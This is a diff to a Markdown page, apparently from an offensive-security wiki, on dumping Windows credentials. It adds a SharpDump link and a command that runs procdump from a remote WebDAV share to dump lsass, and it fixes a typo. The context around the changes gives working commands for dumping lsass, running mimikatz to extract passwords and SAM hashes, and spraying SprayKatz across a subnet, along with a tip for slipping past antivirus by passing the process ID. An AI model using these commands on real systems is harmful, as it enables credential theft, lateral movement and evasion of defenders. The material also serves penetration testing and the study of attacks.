@@ -58,12 +58,16 @@ mimikatz_command -f "lsadump::sam"
 As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
 You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
 
+You could also use [SharpDump](https://github.com/GhostPack/SharpDump).
+
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -75,7 +79,7 @@ mimikatz # sekurlsa::logonPasswords
 
 This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead o**f the **name lsass.exe.**
+**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**
 
 ### Dumping lsass with **comsvcs.dll**
 
